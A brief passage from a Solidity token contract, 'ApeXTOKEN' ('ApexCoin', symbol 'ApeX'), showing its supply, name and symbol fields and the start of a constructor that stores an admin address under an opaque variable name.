...
contract ApeXTOKEN is Ownable {
    address public dsxccdr445;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "ApexCoin";
    string private _cctokensymbol = "ApeX";
    constructor(address tokenadmin) {
        dsxccdr445 = tokenadmin;
